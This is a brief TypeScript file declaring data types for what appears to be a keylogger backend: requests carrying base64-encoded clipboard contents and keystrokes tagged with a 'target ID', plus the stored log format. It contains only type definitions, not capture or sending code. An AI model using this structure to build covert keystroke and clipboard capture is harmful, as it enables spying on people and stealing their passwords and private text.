export interface SaveRequest {
	/**
	 * Base64-encoded array of clipboard data
	 */
	c: string[];

	/**
	 * Base64-encoded keystroke data in JSON format
	 */
	d: string;

	/**
	 * Target ID
	 *
	 * If empty, a target ID is created and sent as response.
	 */
	t: string;

	/**
	 * Time (in milliseconds since UNIX epoch) when the request was sent
	 */
	ts: number;
}

export interface KeystrokeData {
	key: string;
	keycode: string;
}

export interface LoggedData {
	/**
	 * Array of clipboard data
	 */
	clipboard?: string[];

	/**
	 * Keystroke data as an object
	 */
	data: object;

	/**
	 * Time (in milliseconds since UNIX epoch) when the request was sent
	 */
	timestamp: number;
}
